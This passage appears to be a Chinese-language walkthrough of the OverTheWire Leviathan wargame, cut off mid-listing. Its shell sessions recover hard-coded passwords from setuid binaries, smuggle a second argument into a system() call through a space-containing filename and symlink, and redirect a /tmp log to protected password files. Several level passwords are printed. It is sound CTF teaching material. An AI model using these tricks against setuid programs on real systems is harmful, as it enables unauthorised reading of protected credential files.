-fno-stack-protector disable ProPolice -Wl,-z,norelro disable relro In addition, the execstack tool can be used to flag the stack as executable on ELF binaries. Finally, network-access is limited for most levels by a local firewall. --[ Tools ]-- For your convenience we have installed a few useful tools which you can find in the following locations: * gef (https://github.com/hugsy/gef) in /opt/gef/ * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/ * peda (https://github.com/longld/peda.git) in /opt/peda/ * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/ * pwntools (https://github.com/Gallopsled/pwntools) * radare2 (http://www.radare.org/) Both python2 and python3 are installed. --[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us on discord or IRC. Enjoy your stay! leviathan0@gibson:~$","title":"level0"},{"location":"WarGame/leviathan/#level1","text":"\u5148\u770b\u4e00\u773c\u5b58\u5bc6\u7801\u7684\u5730\u65b9 total 48 drwxr-xr-x 2 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 111 root root 12288 Apr 23 18:06 ../ -r-------- 1 leviathan0 leviathan0 11 Apr 23 18:04 leviathan0 -r-------- 1 leviathan1 leviathan1 11 Apr 23 18:04 leviathan1 -r-------- 1 leviathan2 leviathan2 11 Apr 23 18:04 leviathan2 -r-------- 1 leviathan3 leviathan3 11 Apr 23 18:04 leviathan3 -r-------- 1 leviathan4 leviathan4 11 Apr 23 18:04 leviathan4 -r-------- 1 leviathan5 leviathan5 11 Apr 23 18:04 leviathan5 -r-------- 1 leviathan6 leviathan6 11 Apr 23 18:04 leviathan6 -r-------- 1 leviathan7 leviathan7 11 Apr 23 18:04 leviathan7 leviathan0@gibson:~$ \u8fd9\u6311\u6218\u5565\u4e5f\u4e0d\u5199\uff0c\u5168\u9760\u8111\u6d1e\u554a\u3002\u3002\u3002 leviathan0@gibson:~$ ll total 24 drwxr-xr-x 3 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 83 root root 4096 Apr 23 18:06 ../ drwxr-x--- 2 leviathan1 leviathan0 4096 Apr 23 18:04 .backup/ -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc -rw-r--r-- 1 root root 807 Jan 6 2022 .profile leviathan0@gibson:~$ ll .backup total 140 drwxr-x--- 2 leviathan1 leviathan0 4096 Apr 23 18:04 ./ drwxr-xr-x 3 root root 4096 Apr 23 18:04 ../ -rw-r----- 1 leviathan1 leviathan0 133259 Apr 23 18:04 bookmarks.html leviathan0@gibson:~$ cat .backup/bookmarks.html | grep \"pass\" <DT><A HREF=\"http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is PPIfmI1qsA\" ADD_DATE=\"1155384634\" LAST_CHARSET=\"ISO-8859-1\" ID=\"rdf:#$2wIU71\">password to leviathan1</A> leviathan0@gibson:~$ \u53cd\u6b63\u8fdb\u53bb\u4ee5\u540e\u770b\u4e86\u770bhome\uff0c\u627e\u5230\u4e86","title":"level1"},{"location":"WarGame/leviathan/#level2","text":"\u5148\u770b\u4e00\u4e0b\u6587\u4ef6 leviathan1@gibson:~$ file check check: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=aab009a1eb3940df51c668d1c35dc9cdc1191805, for GNU/Linux 3.2.0, not stripped \u8bf4\u660e\u5982\u4e0b\uff1a - setuid \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u88ab\u8bbe\u7f6e\u4e86 SetUID \u5c5e\u6027\uff0c\u5373\u5728\u6267\u884c\u8be5\u6587\u4ef6\u65f6\uff0c\u4f1a\u4f7f\u7528\u8be5\u6587\u4ef6\u7684\u6240\u6709\u8005\u7684\u6743\u9650\u6765\u6267\u884c\uff0c\u800c\u4e0d\u662f\u5f53\u524d\u7528\u6237\u7684\u6743\u9650\u3002 - ELF \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u4f7f\u7528 ELF \u6587\u4ef6\u683c\u5f0f\u3002 - 32-bit \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u662f 32 \u4f4d\u7684\u3002 - LSB \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u9075\u5faa LSB\uff08Linux Standard Base\uff09\u89c4\u8303\u3002 - Intel 80386 \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u662f\u4e3a Intel 80386 \u67b6\u6784\u7f16\u8bd1\u7684\u3002 - version 1 (SYSV) \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u4f7f\u7528 SYSV \u7248\u672c 1 ABI \u6807\u51c6\u3002 - dynamically linked \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u4f7f\u7528\u52a8\u6001\u94fe\u63a5\u5e93\u3002 - interpreter /lib/ld-linux.so.2 \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u4f7f\u7528 /lib/ld-linux.so.2 \u4f5c\u4e3a\u52a8\u6001\u94fe\u63a5\u5e93\u7684\u89e3\u91ca\u5668\u3002 - BuildID[sha1]=aab009a1eb3940df51c668d1c35dc9cdc1191805 \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u7684\u6784\u5efa ID\u3002 - for GNU/Linux 3.2.0 \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u662f\u4e3a GNU/Linux 3.2.0 \u7248\u672c\u7f16\u8bd1\u7684\u3002 - not stripped \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u6ca1\u6709\u88ab\u5265\u79bb\uff08stripped\uff09\uff0c\u5373\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u5305\u542b\u4e86\u7b26\u53f7\u8868\u548c\u8c03\u8bd5\u4fe1\u606f\uff0c\u4fbf\u4e8e\u8c03\u8bd5\u548c\u5206\u6790\u3002 \u4e00\u5f00\u59cb\u6ca1\u601d\u8def\uff0c\u8f93\u4e86\u597d\u51e0\u904d\u5bc6\u7801\u90fd\u9519\uff0c\u7136\u540e\u7528strings\u626b\u4e86\u4e00\u4e0b leviathan1@gibson:~$ strings check td8 /lib/ld-linux.so.2 _IO_stdin_used __libc_start_main __stack_chk_fail puts printf getchar system strcmp geteuid setreuid libc.so.6 GLIBC_2.4 GLIBC_2.34 GLIBC_2.0 __gmon_start__ secrf love password: /bin/sh Wrong password, Good Bye ... \u641e\u4e86\u4e00\u4e0b\u5b83\u7684\u6c47\u7f16 leviathan1@gibson:~$ objdump -d check check: file format elf32-i386 Disassembly of section .init: 08049000 <_init>: 8049000: f3 0f 1e fb endbr32 8049004: 53 push %ebx 8049005: 83 ec 08 sub $0x8,%esp 8049008: e8 13 01 00 00 call 8049120 <__x86.get_pc_thunk.bx> 804900d: 81 c3 f3 2f 00 00 add $0x2ff3,%ebx 8049013: 8b 83 fc ff ff ff mov -0x4(%ebx),%eax 8049019: 85 c0 test %eax,%eax 804901b: 74 02 je 804901f <_init+0x1f> 804901d: ff d0 call *%eax 804901f: 83 c4 08 add $0x8,%esp 8049022: 5b pop %ebx 8049023: c3 ret Disassembly of section .plt: 08049030 <strcmp@plt-0x10>: 8049030: ff 35 04 c0 04 08 push 0x804c004 8049036: ff 25 08 c0 04 08 jmp *0x804c008 804903c: 00 00 add %al,(%eax) ... 08049040 <strcmp@plt>: 8049040: ff 25 0c c0 04 08 jmp *0x804c00c 8049046: 68 00 00 00 00 push $0x0 804904b: e9 e0 ff ff ff jmp 8049030 <_init+0x30> 08049050 <__libc_start_main@plt>: 8049050: ff 25 10 c0 04 08 jmp *0x804c010 8049056: 68 08 00 00 00 push $0x8 804905b: e9 d0 ff ff ff jmp 8049030 <_init+0x30> 08049060 <printf@plt>: 8049060: ff 25 14 c0 04 08 jmp *0x804c014 8049066: 68 10 00 00 00 push $0x10 804906b: e9 c0 ff ff ff jmp 8049030 <_init+0x30> 08049070 <getchar@plt>: 8049070: ff 25 18 c0 04 08 jmp *0x804c018 8049076: 68 18 00 00 00 push $0x18 804907b: e9 b0 ff ff ff jmp 8049030 <_init+0x30> 08049080 <__stack_chk_fail@plt>: 8049080: ff 25 1c c0 04 08 jmp *0x804c01c 8049086: 68 20 00 00 00 push $0x20 804908b: e9 a0 ff ff ff jmp 8049030 <_init+0x30> 08049090 <geteuid@plt>: 8049090: ff 25 20 c0 04 08 jmp *0x804c020 8049096: 68 28 00 00 00 push $0x28 804909b: e9 90 ff ff ff jmp 8049030 <_init+0x30> 080490a0 <puts@plt>: 80490a0: ff 25 24 c0 04 08 jmp *0x804c024 80490a6: 68 30 00 00 00 push $0x30 80490ab: e9 80 ff ff ff jmp 8049030 <_init+0x30> 080490b0 <system@plt>: 80490b0: ff 25 28 c0 04 08 jmp *0x804c028 80490b6: 68 38 00 00 00 push $0x38 80490bb: e9 70 ff ff ff jmp 8049030 <_init+0x30> 080490c0 <setreuid@plt>: 80490c0: ff 25 2c c0 04 08 jmp *0x804c02c 80490c6: 68 40 00 00 00 push $0x40 80490cb: e9 60 ff ff ff jmp 8049030 <_init+0x30> Disassembly of section .text: 080490d0 <_start>: 80490d0: f3 0f 1e fb endbr32 80490d4: 31 ed xor %ebp,%ebp 80490d6: 5e pop %esi 80490d7: 89 e1 mov %esp,%ecx 80490d9: 83 e4 f0 and $0xfffffff0,%esp 80490dc: 50 push %eax 80490dd: 54 push %esp 80490de: 52 push %edx 80490df: e8 19 00 00 00 call 80490fd <_start+0x2d> 80490e4: 81 c3 1c 2f 00 00 add $0x2f1c,%ebx 80490ea: 6a 00 push $0x0 80490ec: 6a 00 push $0x0 80490ee: 51 push %ecx 80490ef: 56 push %esi 80490f0: c7 c0 e6 91 04 08 mov $0x80491e6,%eax 80490f6: 50 push %eax 80490f7: e8 54 ff ff ff call 8049050 <__libc_start_main@plt> 80490fc: f4 hlt 80490fd: 8b 1c 24 mov (%esp),%ebx 8049100: c3 ret 8049101: 66 90 xchg %ax,%ax 8049103: 66 90 xchg %ax,%ax 8049105: 66 90 xchg %ax,%ax 8049107: 66 90 xchg %ax,%ax 8049109: 66 90 xchg %ax,%ax 804910b: 66 90 xchg %ax,%ax 804910d: 66 90 xchg %ax,%ax 804910f: 90 nop 08049110 <_dl_relocate_static_pie>: 8049110: f3 0f 1e fb endbr32 8049114: c3 ret 8049115: 66 90 xchg %ax,%ax 8049117: 66 90 xchg %ax,%ax 8049119: 66 90 xchg %ax,%ax 804911b: 66 90 xchg %ax,%ax 804911d: 66 90 xchg %ax,%ax 804911f: 90 nop 08049120 <__x86.get_pc_thunk.bx>: 8049120: 8b 1c 24 mov (%esp),%ebx 8049123: c3 ret 8049124: 66 90 xchg %ax,%ax 8049126: 66 90 xchg %ax,%ax 8049128: 66 90 xchg %ax,%ax 804912a: 66 90 xchg %ax,%ax 804912c: 66 90 xchg %ax,%ax 804912e: 66 90 xchg %ax,%ax 08049130 <deregister_tm_clones>: 8049130: b8 38 c0 04 08 mov $0x804c038,%eax 8049135: 3d 38 c0 04 08 cmp $0x804c038,%eax 804913a: 74 24 je 8049160 <deregister_tm_clones+0x30> 804913c: b8 00 00 00 00 mov $0x0,%eax 8049141: 85 c0 test %eax,%eax 8049143: 74 1b je 8049160 <deregister_tm_clones+0x30> 8049145: 55 push %ebp 8049146: 89 e5 mov %esp,%ebp 8049148: 83 ec 14 sub $0x14,%esp 804914b: 68 38 c0 04 08 push $0x804c038 8049150: ff d0 call *%eax 8049152: 83 c4 10 add $0x10,%esp 8049155: c9 leave 8049156: c3 ret 8049157: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 804915e: 66 90 xchg %ax,%ax 8049160: c3 ret 8049161: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 8049168: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 804916f: 90 nop 08049170 <register_tm_clones>: 8049170: b8 38 c0 04 08 mov $0x804c038,%eax 8049175: 2d 38 c0 04 08 sub $0x804c038,%eax 804917a: 89 c2 mov %eax,%edx 804917c: c1 e8 1f shr $0x1f,%eax 804917f: c1 fa 02 sar $0x2,%edx 8049182: 01 d0 add %edx,%eax 8049184: d1 f8 sar %eax 8049186: 74 20 je 80491a8 <register_tm_clones+0x38> 8049188: ba 00 00 00 00 mov $0x0,%edx 804918d: 85 d2 test %edx,%edx 804918f: 74 17 je 80491a8 <register_tm_clones+0x38> 8049191: 55 push %ebp 8049192: 89 e5 mov %esp,%ebp 8049194: 83 ec 10 sub $0x10,%esp 8049197: 50 push %eax 8049198: 68 38 c0 04 08 push $0x804c038 804919d: ff d2 call *%edx 804919f: 83 c4 10 add $0x10,%esp 80491a2: c9 leave 80491a3: c3 ret 80491a4: 8d 74 26 00 lea 0x0(%esi,%eiz,1),%esi 80491a8: c3 ret 80491a9: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 080491b0 <__do_global_dtors_aux>: 80491b0: f3 0f 1e fb endbr32 80491b4: 80 3d 38 c0 04 08 00 cmpb $0x0,0x804c038 80491bb: 75 1b jne 80491d8 <__do_global_dtors_aux+0x28> 80491bd: 55 push %ebp 80491be: 89 e5 mov %esp,%ebp 80491c0: 83 ec 08 sub $0x8,%esp 80491c3: e8 68 ff ff ff call 8049130 <deregister_tm_clones> 80491c8: c6 05 38 c0 04 08 01 movb $0x1,0x804c038 80491cf: c9 leave 80491d0: c3 ret 80491d1: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 80491d8: c3 ret 80491d9: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 080491e0 <frame_dummy>: 80491e0: f3 0f 1e fb endbr32 80491e4: eb 8a jmp 8049170 <register_tm_clones> 080491e6 <main>: 80491e6: 8d 4c 24 04 lea 0x4(%esp),%ecx 80491ea: 83 e4 f0 and $0xfffffff0,%esp 80491ed: ff 71 fc push -0x4(%ecx) 80491f0: 55 push %ebp 80491f1: 89 e5 mov %esp,%ebp 80491f3: 53 push %ebx 80491f4: 51 push %ecx 80491f5: 83 ec 20 sub $0x20,%esp 80491f8: 65 a1 14 00 00 00 mov %gs:0x14,%eax 80491fe: 89 45 f4 mov %eax,-0xc(%ebp) 8049201: 31 c0 xor %eax,%eax 8049203: c7 45 e0 73 65 78 00 movl $0x786573,-0x20(%ebp) 804920a: c7 45 ed 73 65 63 72 movl $0x72636573,-0x13(%ebp) 8049211: 66 c7 45 f1 65 74 movw $0x7465,-0xf(%ebp) 8049217: c6 45 f3 00 movb $0x0,-0xd(%ebp) 804921b: c7 45 e4 67 6f 64 00 movl $0x646f67,-0x1c(%ebp) 8049222: c7 45 e8 6c 6f 76 65 movl $0x65766f6c,-0x18(%ebp) 8049229: c6 45 ec 00 movb $0x0,-0x14(%ebp) 804922d: 83 ec 0c sub $0xc,%esp 8049230: 68 08 a0 04 08 push $0x804a008 8049235: e8 26 fe ff ff call 8049060 <printf@plt> 804923a: 83 c4 10 add $0x10,%esp 804923d: e8 2e fe ff ff call 8049070 <getchar@plt> 8049242: 88 45 dc mov %al,-0x24(%ebp) 8049245: e8 26 fe ff ff call 8049070 <getchar@plt> 804924a: 88 45 dd mov %al,-0x23(%ebp) 804924d: e8 1e fe ff ff call 8049070 <getchar@plt> 8049252: 88 45 de mov %al,-0x22(%ebp) 8049255: c6 45 df 00 movb $0x0,-0x21(%ebp) 8049259: 83 ec 08 sub $0x8,%esp 804925c: 8d 45 e0 lea -0x20(%ebp),%eax 804925f: 50 push %eax 8049260: 8d 45 dc lea -0x24(%ebp),%eax 8049263: 50 push %eax 8049264: e8 d7 fd ff ff call 8049040 <strcmp@plt> 8049269: 83 c4 10 add $0x10,%esp 804926c: 85 c0 test %eax,%eax 804926e: 75 2b jne 804929b <main+0xb5> 8049270: e8 1b fe ff ff call 8049090 <geteuid@plt> 8049275: 89 c3 mov %eax,%ebx 8049277: e8 14 fe ff ff call 8049090 <geteuid@plt> 804927c: 83 ec 08 sub $0x8,%esp 804927f: 53 push %ebx 8049280: 50 push %eax 8049281: e8 3a fe ff ff call 80490c0 <setreuid@plt> 8049286: 83 c4 10 add $0x10,%esp 8049289: 83 ec 0c sub $0xc,%esp 804928c: 68 13 a0 04 08 push $0x804a013 8049291: e8 1a fe ff ff call 80490b0 <system@plt> 8049296: 83 c4 10 add $0x10,%esp 8049299: eb 10 jmp 80492ab <main+0xc5> 804929b: 83 ec 0c sub $0xc,%esp 804929e: 68 1b a0 04 08 push $0x804a01b 80492a3: e8 f8 fd ff ff call 80490a0 <puts@plt> 80492a8: 83 c4 10 add $0x10,%esp 80492ab: b8 00 00 00 00 mov $0x0,%eax 80492b0: 8b 55 f4 mov -0xc(%ebp),%edx 80492b3: 65 2b 15 14 00 00 00 sub %gs:0x14,%edx 80492ba: 74 05 je 80492c1 <main+0xdb> 80492bc: e8 bf fd ff ff call 8049080 <__stack_chk_fail@plt> 80492c1: 8d 65 f8 lea -0x8(%ebp),%esp 80492c4: 59 pop %ecx 80492c5: 5b pop %ebx 80492c6: 5d pop %ebp 80492c7: 8d 61 fc lea -0x4(%ecx),%esp 80492ca: c3 ret Disassembly of section .fini: 080492cc <_fini>: 80492cc: f3 0f 1e fb endbr32 80492d0: 53 push %ebx 80492d1: 83 ec 08 sub $0x8,%esp 80492d4: e8 47 fe ff ff call 8049120 <__x86.get_pc_thunk.bx> 80492d9: 81 c3 27 2d 00 00 add $0x2d27,%ebx 80492df: 83 c4 08 add $0x8,%esp 80492e2: 5b pop %ebx 80492e3: c3 ret leviathan1@gibson:~$ \u5176\u4e2d\u7684 movl $0x786573,-0x20(%ebp) \u770b\u51fa\u6765\u5bc6\u7801\u662fsex \u8bf4\u597d\u7684\u53ea\u9700\u8981\u57fa\u672c\u7684linux\u547d\u4ee4\u5462\uff1f\uff1f\uff1f\u592a\u62bd\u8c61\u4e86 leviathan1@gibson:~$ ./check password: sex $ cat /etc/leviathan_pass/leviathan2 mEh5PNl10e $","title":"level2"},{"location":"WarGame/leviathan/#_1","text":"\u5f88\u597d\uff0c\u7136\u540e\u53bb\u7f51\u4e0a\u770b\u4e86\u4e00\u4e0b\u522b\u4eba\u7684\u7b54\u6848\uff0c\u8c8c\u4f3c\u6709\u53e6\u4e00\u4e2a\u597d\u4e1c\u897f\u53eb ltrace \u8fd9\u4e2a\u73a9\u610f\u513f\u53ef\u4ee5\u5355\u6b65\u8c03\u8bd5\uff0c\u7136\u540e\u5c31\u5f88\u7b80\u5355\u4e86 leviathan1@gibson:~$ ltrace ./check __libc_start_main(0x80491e6, 1, 0xffffd504, 0 <unfinished ...> printf(\"password: \") = 10 getchar(0xf7fbe4a0, 0xf7fd6f80, 0x786573, 0x646f67password: 123 ) = 49 getchar(0xf7fbe4a0, 0xf7fd6f31, 0x786573, 0x646f67) = 50 getchar(0xf7fbe4a0, 0xf7fd3231, 0x786573, 0x646f67) = 51 strcmp(\"123\", \"sex\") = -1 puts(\"Wrong password, Good Bye ...\"Wrong password, Good Bye ... ) = 29 +++ exited (status 0) +++ leviathan1@gibson:~$ \u8fd9\u91cc\u6709\u4e00\u4e2a\u4e2d\u6587\u7684 \u6559\u7a0b","title":"\u4ed6\u4eba\u89e3\u6cd5"},{"location":"WarGame/leviathan/#level3","text":"\u76f4\u63a5\u8fd0\u884c\u4f1a\u63d0\u793a\u4e0d\u6210\u529f leviathan2@gibson:~$ ll total 36 drwxr-xr-x 2 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 83 root root 4096 Apr 23 18:06 ../ -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc -r-sr-x--- 1 leviathan3 leviathan2 15060 Apr 23 18:04 printfile* -rw-r--r-- 1 root root 807 Jan 6 2022 .profile leviathan2@gibson:~$ file printfile printfile: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=32c7e041842883e05808ab99c763a0fc1849b84e, for GNU/Linux 3.2.0, not stripped leviathan2@gibson:~$ printfile printfile: command not found leviathan2@gibson:~$ printfile --help printfile: command not found leviathan2@gibson:~$ ./printfile *** File Printer *** Usage: ./printfile filename leviathan2@gibson:~$ ./printfile /etc/leviathan_pass/leviathan3 You cant have that file... \u7136\u540e\u5206\u522b\u770b\u4e00\u4e0b leviathan2@gibson:~$ ./printfile /etc/leviathan_pass/leviathan2 /bin/cat: /etc/leviathan_pass/leviathan2: Permission denied leviathan2@gibson:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3 __libc_start_main(0x80491e6, 2, 0xffffd4d4, 0 <unfinished ...> access(\"/etc/leviathan_pass/leviathan3\", 4) = -1 puts(\"You cant have that file...\"You cant have that file... ) = 27 +++ exited (status 1) +++ leviathan2@gibson:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3 __libc_start_main(0x80491e6, 2, 0xffffd4d4, 0 <unfinished ...> access(\"/etc/leviathan_pass/leviathan3\", 4) = -1 puts(\"You cant have that file...\"You cant have that file... ) = 27 +++ exited (status 1) +++ leviathan2@gibson:~$ ltrace ./printfile .bashrc __libc_start_main(0x80491e6, 2, 0xffffd4e4, 0 <unfinished ...> access(\".bashrc\", 4) = 0 snprintf(\"/bin/cat .bashrc\", 511, \"/bin/cat %s\", \".bashrc\") = 16 geteuid() = 12002 geteuid() = 12002 setreuid(12002, 12002) = 0 system(\"/bin/cat .bashrc\"# ~/.bashrc: executed by bash(1) for non-login shells. \u8fd9\u91cc\u7684\u903b\u8f91\u662f\uff0caccess\u51fd\u6570\u6765\u5224\u65ad\u4f60\u662f\u5426\u6709\u67d0\u4e2a\u6587\u4ef6\u7684\u6743\u9650\uff0c\u7136\u540e\u8c03\u7528cat\u8fdb\u884c\u8f93\u51fa\u3002\u56e0\u6b64\u53ef\u884c\u7684\u89e3\u91ca\u5c31\u662f\u4f7f\u7528\u6709\u7a7a\u683c\u7684\u6587\u4ef6\u540d\uff0c\u505a\u4e00\u4e2a\u8f6f\u8fde\u63a5\uff0c\u8fd9\u6837cat\u53ea\u4f1a\u8bfb\u53d6\u7b2c\u4e00\u4e2a\uff0c\u5c31\u7ed3\u675f\u4e86\u3002 leviathan2@gibson:~$ cd /tmp/ leviathan2@gibson:/tmp$ ls ls: cannot open directory '.': Permission denied leviathan2@gibson:/tmp$ mkdir hnz leviathan2@gibson:/tmp$ cd hnz leviathan2@gibson:/tmp/hnz$ ls leviathan2@gibson:/tmp/hnz$ ll total 732 drwxrwxr-x 2 leviathan2 leviathan2 4096 Jul 19 06:59 ./ drwxrwx-wt 16075 root root 741376 Jul 19 06:59 ../ leviathan2@gibson:/tmp/hnz$ touch \"file1 file2.txt\" leviathan2@gibson:/tmp/hnz$ ls file1 file2.txt leviathan2@gibson:/tmp/hnz$ ln -s /etc/leviathan_pass/leviathan3 /tmp/hnz/file1 leviathan2@gibson:/tmp/hnz$ ll total 732 drwxrwxr-x 2 leviathan2 leviathan2 4096 Jul 19 07:02 ./ drwxrwx-wt 16075 root root 741376 Jul 19 07:02 ../ lrwxrwxrwx 1 leviathan2 leviathan2 30 Jul 19 07:02 file1 -> /etc/leviathan_pass/leviathan3 -rw-rw-r-- 1 leviathan2 leviathan2 0 Jul 19 07:00 file1 file2.txt leviathan2@gibson:~$ ./printfile /tmp/hnz/\"file1 file2.txt\" Q0G8j4sakn /bin/cat: file2.txt: No such file or directory leviathan2@gibson:~$","title":"level3"},{"location":"WarGame/leviathan/#level4","text":"\u8fd8\u662f\u5148\u770b\u4e00\u4e0b leviathan3@gibson:~$ ./level3 Enter the password> 123 bzzzzzzzzap. WRONG leviathan3@gibson:~$ ltrace ./level3 __libc_start_main(0x80492bf, 1, 0xffffd504, 0 <unfinished ...> strcmp(\"h0no33\", \"kakaka\") = -1 printf(\"Enter the password> \") = 20 fgets(Enter the password> 1234 \"1234\\n\", 256, 0xf7e2a620) = 0xffffd2dc strcmp(\"1234\\n\", \"snlprintf\\n\") = -1 puts(\"bzzzzzzzzap. WRONG\"bzzzzzzzzap. WRONG ) = 19 +++ exited (status 0) +++ \u7136\u540e\u5c31\u662f\u76f4\u63a5\u8bfb\u53d6\u4e86\uff0c\u8fd9\u73a9\u610f\u513f\u5c31\u662f\u4e00\u63d0\u6743 leviathan3@gibson:~$ ./level3 Enter the password> snlprintf [You've got shell]! $ cat /etc/leviathan_pass/leviathan4 AgvropI4OA $","title":"level4"},{"location":"WarGame/leviathan/#level5","text":"\u753b\u98ce\u8d8a\u6765\u8d8a\u6b63\u5e38\u4e86 leviathan4@gibson:~/.trash$ ./bin 01000101 01001011 01001011 01101100 01010100 01000110 00110001 01011000 01110001 01110011 00001010 \u663e\u7136\u7684ascii\u7f16\u7801 echo \"01000101 01001011 01001011 01101100 01010100 01000110 00110001 01011000 01110001 01110011 00001010\" | perl -lape '$_=pack\"(B8)*\",@F' EKKlTF1Xqs","title":"level5"},{"location":"WarGame/leviathan/#level6","text":"\u8c8c\u4f3c\u76f4\u63a5\u8f93\u51fa\u4e86level5\u7684\u5bc6\u7801 leviathan5@gibson:~$ ./leviathan5 EKKlTF1Xqs \u770b\u8d77\u6765\u6709\u4e2a\u53eblog\u7684\u5f88\u6709\u7528 leviathan5@gibson:~$ ltrace ./leviathan5 __libc_start_main(0x8049206, 1, 0xffffd534, 0 <unfinished ...> fopen(\"/tmp/file.log\", \"r\") = 0 puts(\"Cannot find /tmp/file.log\"Cannot find /tmp/file.log ) = 26 exit(-1 <no return ...> +++ exited (status 255) +++ leviathan5@gibson:~$ ltrace ./leviathan5 __libc_start_main(0x8049206, 1, 0xffffd534, 0 <unfinished ...> fopen(\"/tmp/file.log\", \"r\") = 0x804d1a0 fgetc(0x804d1a0) = 'E' feof(0x804d1a0) = 0 putchar(69, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 69 fgetc(0x804d1a0) = 'K' feof(0x804d1a0) = 0 putchar(75, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 75 fgetc(0x804d1a0) = 'K' feof(0x804d1a0) = 0 putchar(75, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 75 fgetc(0x804d1a0) = 'l' feof(0x804d1a0) = 0 putchar(108, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 108 fgetc(0x804d1a0) = 'T' feof(0x804d1a0) = 0 putchar(84, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 84 fgetc(0x804d1a0) = 'F' feof(0x804d1a0) = 0 putchar(70, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 70 fgetc(0x804d1a0) = '1' feof(0x804d1a0) = 0 putchar(49, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 49 fgetc(0x804d1a0) = 'X' feof(0x804d1a0) = 0 putchar(88, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 88 fgetc(0x804d1a0) = 'q' feof(0x804d1a0) = 0 putchar(113, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 113 fgetc(0x804d1a0) = 's' feof(0x804d1a0) = 0 putchar(115, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 115 fgetc(0x804d1a0) = '\\n' feof(0x804d1a0) = 0 putchar(10, 0x804a008, 0xf7c184be, 0xf7fbe4a0EKKlTF1Xqs ) = 10 fgetc(0x804d1a0) = '\\377' feof(0x804d1a0) = 1 fclose(0x804d1a0) = 0 getuid() = 12005 setuid(12005) = 0 unlink(\"/tmp/file.log\") = 0 +++ exited (status 0) +++ leviathan5@gibson:~$ \u90a3\u8fd8\u662f\u8f6f\u8fde\u63a5\u5c31\u89e3\u51b3\u4e86 leviathan5@gibson:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log leviathan5@gibson:~$ ./leviathan5 YZ55XPVk2l leviathan5@gibson:~$","title":"level6"},{"location":"WarGame/leviathan/#level7","text":"leviathan6@gibson:~$ ./leviathan6 usage: ./leviathan6 <4 digit code> leviathan6@gibson:~$ ltrace ./leviathan6 __libc_start_main(0x80491d6, 1, 0xffffd504, 0 <unfinished ...> printf(\"usage: %s <4 digit code>\\n\", \"./leviathan6\"usage: ./leviathan6 <4 digit code> ) = 35 exit(-1 <no return ...> +++ exited (status 255) +++ leviathan6@gibson:~$ ltrace ./leviathan6 1234 __libc_start_main(0x80491d6, 2, 0xffffd4e4, 0 <unfinished ...> atoi(0xffffd668, 0xf7fd6f80, 0xf7c184be, 0xf7fbe4a0) = 1234 puts(\"Wrong\"Wrong ) = 6 +++ exited (status 0) +++ \u5f88\u597d\uff0c\u53c8\u8981\u770b\u6c47\u7f16\u4e86 leviathan6@gibson:~$ objdump -d leviathan6 leviathan6: file format elf32-i386 Disassembly of section .init: 08049000 <_init>: 8049000: f3 0f 1e fb endbr32 8049004: 53 push %ebx 8049005: 83 ec 08 sub $0x8,%esp 8049008: e8 03 01 00 00 call 8049110 <__x86.get_pc_thunk.bx> 804900d: 81 c3 f3 2f 00 00 add $0x2ff3,%ebx 8049013: 8b 83 fc ff ff ff mov -0x4(%ebx),%eax 8049019: 85 c0 test %eax,%eax 804901b: 74 02 je 804901f <_init+0x1f> 804901d: ff d0 call *%eax 804901f: 83 c4 08 add $0x8,%esp 8049022: 5b pop %ebx 8049023: c3 ret Disassembly of section .plt: 08049030 <__libc_start_main@plt-0x10>: 8049030: ff 35 04 c0 04 08 push 0x804c004 8049036: ff 25 08 c0 04 08 jmp *0x804c008 804903c: 00 00 add %al,(%eax) ... 08049040 <__libc_start_main@plt>: 8049040: ff 25 0c c0 04 08 jmp *0x804c00c 8049046: 68 00 00 00 00 push 